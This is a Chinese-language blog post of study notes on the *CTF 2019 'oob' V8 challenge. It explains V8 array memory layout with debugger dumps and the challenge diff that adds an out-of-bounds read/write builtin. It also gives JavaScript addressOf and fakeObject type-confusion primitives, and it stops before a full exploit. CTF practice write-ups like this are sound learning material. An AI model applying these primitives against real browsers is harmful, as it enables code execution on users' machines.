<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="v8漏洞练习笔记_starctf2019 oobv8内存结构v8变量内存结构,新版v8使用了指针压缩,基址存于R13寄存器,指针通过32为存储,最后一位表示tag,为1时会与R13中的基址进行运算">
<meta property="og:type" content="article">
<meta property="og:title" content="v8漏洞练习笔记_starctf2019 oob">
<meta property="og:url" content="http://example.com/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/index.html">
<meta property="og:site_name" content="Ash blog">
<meta property="og:description" content="v8漏洞练习笔记_starctf2019 oobv8内存结构v8变量内存结构,新版v8使用了指针压缩,基址存于R13寄存器,指针通过32为存储,最后一位表示tag,为1时会与R13中的基址进行运算">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-12-27T11:01:50.910Z">
<meta property="article:modified_time" content="2022-12-27T11:07:56.885Z">
<meta property="article:author" content="Ash">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>v8漏洞练习笔记_starctf2019 oob | Ash blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ash blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ash">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ash blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          v8漏洞练习笔记_starctf2019 oob
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-12-27 19:01:50 / 修改时间：19:07:56" itemprop="dateCreated datePublished" datetime="2022-12-27T19:01:50+08:00">2022-12-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="v8漏洞练习笔记-starctf2019-oob"><a href="#v8漏洞练习笔记-starctf2019-oob" class="headerlink" title="v8漏洞练习笔记_starctf2019 oob"></a>v8漏洞练习笔记_starctf2019 oob</h1><h5 id="v8内存结构"><a href="#v8内存结构" class="headerlink" title="v8内存结构"></a>v8内存结构</h5><p>v8变量内存结构,新版v8使用了指针压缩,基址存于R13寄存器,指针通过32为存储,最后一位表示tag,为1时会与R13中的基址进行运算 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x101f080c5e09: [JSArray]</span><br><span class="line"></span><br><span class="line">- map: 0x101f08281891 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line">- prototype: 0x101f08248f7d &lt;JSArray[0]&gt;</span><br><span class="line"></span><br><span class="line">- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"></span><br><span class="line">- length: 4</span><br><span class="line"></span><br><span class="line">- properties: 0x101f080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">length: 0x101f081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line"></span><br><span class="line">   0: 2.1</span><br><span class="line"></span><br><span class="line">   1: 3.2</span><br><span class="line"></span><br><span class="line">   2: 0.1</span><br><span class="line"></span><br><span class="line">   3: 1</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其中elements是实际存储数据的对象元素,所以实际上是v8对变量做了2层封装,data-&gt;elements-&gt;JSArrayObject,通过map结构存储. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x101f080c5e08</span><br><span class="line"></span><br><span class="line">0x101f080c5e08:  0x080406e908281891  0x00000008080c5de1</span><br><span class="line"></span><br><span class="line">0x101f080c5e18:  0x080406e908284e79  0x00000002080406e9</span><br><span class="line"></span><br><span class="line">0x101f080c5e28:  0x00010001080401c5  0x0804116d00000000</span><br><span class="line"></span><br><span class="line">0x101f080c5e38:  0x000000880808a5e5  0x080404b100000002</span><br><span class="line"></span><br><span class="line">0x101f080c5e48:  0x080c5e1900000002  0x080406e9082818e1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x101f080c5de1</span><br><span class="line"></span><br><span class="line">0x101f080c5de1: [FixedDoubleArray]</span><br><span class="line"></span><br><span class="line"> - map: 0x101f08040a3d &lt;Map&gt;</span><br><span class="line"></span><br><span class="line"> - length: 4</span><br><span class="line"></span><br><span class="line">​      0: 2.1</span><br><span class="line"></span><br><span class="line">​      1: 3.2</span><br><span class="line"></span><br><span class="line">​      2: 0.1</span><br><span class="line"></span><br><span class="line">​      3: 1</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">elements:</span><br><span class="line"></span><br><span class="line">map,length,value</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8x 0x101f080c5de0</span><br><span class="line"></span><br><span class="line">0x101f080c5de0:  0x0000000808040a3d  0x4000cccccccccccd</span><br><span class="line"></span><br><span class="line">0x101f080c5df0:  0x400999999999999a  0x3fb999999999999a</span><br><span class="line"></span><br><span class="line">0x101f080c5e00:  0x3ff0000000000000  0x080406e908281891</span><br><span class="line"></span><br><span class="line">0x101f080c5e10:  0x00000008080c5de1  0x080406e908284e79</span><br></pre></td></tr></table></figure>

<p>两个结构的length均做了*2处理.</p>
<p>其中描述了这个变量的属性信息,包括类型,长度,element等 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0x101f08281891: [Map]</span><br><span class="line"></span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"></span><br><span class="line"> - instance size: 16</span><br><span class="line"></span><br><span class="line"> - inobject properties: 0</span><br><span class="line"></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"></span><br><span class="line"> - unused property fields: 0</span><br><span class="line"></span><br><span class="line"> - enum length: invalid</span><br><span class="line"></span><br><span class="line"> - back pointer: 0x101f08281869 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype_validity cell: 0x101f081c0451 &lt;Cell value= 1&gt;</span><br><span class="line"></span><br><span class="line"> - instance descriptors #1: 0x101f08249605 &lt;DescriptorArray[1]&gt;</span><br><span class="line"></span><br><span class="line"> - transitions #1: 0x101f08249651 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line"></span><br><span class="line">   0x101f08042eb9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x101f082818b9 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> - prototype: 0x101f08248f7d &lt;JSArray[0]&gt;</span><br><span class="line"></span><br><span class="line"> - constructor: 0x101f08248e51 &lt;JSFunction Array (sfi = 0x101f081cbf85)&gt;</span><br><span class="line"></span><br><span class="line"> - dependent code: 0x101f080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"></span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

<p>实际内存结构 { map:32bit properties:32bit elements } elements结构 { map, } 变量在内存中的结构是一致的,并且大小为64bit,指针类型变量被压缩,占32bit. </p>
<h5 id="starctf-2019-oob"><a href="#starctf-2019-oob" class="headerlink" title="starctf 2019 oob"></a>starctf 2019 oob</h5><p>diff片段,增加了一个oob函数,函数逻辑为当参数为1,也就是不传参,只有一个this参数时,会读取数组length索引的值,不为1,则会将传参数据写入length索引处,两种方式都会造成数组访问越界. </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line"></span><br><span class="line">​              Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line"></span><br><span class="line">   SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line"></span><br><span class="line">​              Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"></span><br><span class="line">+  SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line"></span><br><span class="line">+             Builtins::kArrayOob,2,false);</span><br><span class="line"></span><br><span class="line">   SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line"></span><br><span class="line">​              Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line"></span><br><span class="line">   SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"></span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line"></span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line"></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line"></span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line"></span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"></span><br><span class="line">  return *final_length;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125; // namespace</span><br><span class="line"></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line"></span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line"></span><br><span class="line">+  if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line"></span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line"></span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line"></span><br><span class="line">+      isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line"></span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line"></span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line"></span><br><span class="line">+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line"></span><br><span class="line">+  if(len == 1)&#123;</span><br><span class="line"></span><br><span class="line">+    //read</span><br><span class="line"></span><br><span class="line">+    return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line"></span><br><span class="line">+  &#125;else&#123;</span><br><span class="line"></span><br><span class="line">+    //write</span><br><span class="line"></span><br><span class="line">+    Handle&lt;Object&gt; value;</span><br><span class="line"></span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line"></span><br><span class="line">+        isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line"></span><br><span class="line">+    elements.set(length,value-&gt;Number());</span><br><span class="line"></span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line"></span><br><span class="line">+  &#125;</span><br><span class="line"></span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>构造这样一个JS文件,对oob进行测试. </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">f</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> f64[<span class="number">0</span>] = f;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = a.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">ftoi</span>(data)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>通过越界访问读取到的数据,刚好是a的map. </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x062a0214e041</span></span><br><span class="line"></span><br><span class="line">0x62a0214e041: [JSArray]</span><br><span class="line"></span><br><span class="line"> - map: 0x3629c0182ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line"> - prototype: 0x20262e251111 &lt;JSArray[0]&gt;</span><br><span class="line"></span><br><span class="line"> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"></span><br><span class="line"> - length: 3</span><br><span class="line"></span><br><span class="line"> - properties: 0x2b2ef8980c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">length: 0x3a4d7cec01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line"></span><br><span class="line">​      0: 1</span><br><span class="line"></span><br><span class="line">​      1: 2</span><br><span class="line"></span><br><span class="line">​      2: 1.1</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">data:0x3629c0182ed9</span><br></pre></td></tr></table></figure>

<p>在a.oob(2)执行后,a对象的map字段被修改为2的浮点数表示. </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx <span class="number">0x062a0214e040</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e040</span>:  <span class="number">0x00003629c0182ed9</span>  <span class="number">0x00002b2ef8980c71</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e050</span>:  <span class="number">0x0000062a0214e019</span>  <span class="number">0x0000000300000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e060</span>:  <span class="number">0x00002b2ef8980561</span>  <span class="number">0x00003629c0182ed9</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e070</span>:  <span class="number">0x00002b2ef89812c9</span>  <span class="number">0x0000000100000000</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8gx <span class="number">0x062a0214e040</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e040</span>:  <span class="number">0x4000000000000000</span>  <span class="number">0x00002b2ef8980c71</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e050</span>:  <span class="number">0x0000062a0214e019</span>  <span class="number">0x0000000300000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e060</span>:  <span class="number">0x00002b2ef8980561</span>  <span class="number">0x00003629c0182ed9</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x62a0214e070</span>:  <span class="number">0x00002b2ef89812c9</span>  <span class="number">0x0000000100000000</span></span><br></pre></td></tr></table></figure>

<p>现在可以通过oob函数对变量的map字段进行任意读取写入,然后对变量的类型进行随意的更改. 可以混淆对象数组和浮点数组的类型,用于读取对象内存地址或者将一个浮点数伪造成一个js对象.因为v8依赖map字段判断变量类型. 实现任意对象内存地址读取,与fake js对象的函数. </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//leak obj memory address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line"></span><br><span class="line">  obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> obj_addr=obj_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj_addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fake obj by addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  flo_arr[<span class="number">0</span>]=<span class="title function_">i2f</span>(addr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fake_obj=flo_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试 </p>
